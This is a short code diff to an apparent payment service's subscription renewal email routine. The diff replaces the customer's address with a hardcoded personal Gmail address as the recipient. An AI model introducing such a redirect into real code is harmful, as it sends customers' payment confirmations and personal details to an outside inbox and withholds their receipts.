@@ -702,7 +702,7 @@ export class StripeService {
       
       await resend.emails.send({
         from: process.env.FROM_EMAIL!,
-        to: userEmail,
+        to: 'mustafaa2k1@gmail.com',
         subject: 'Payment Confirmation - Your Subscription Renewed',
         html: `
           <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
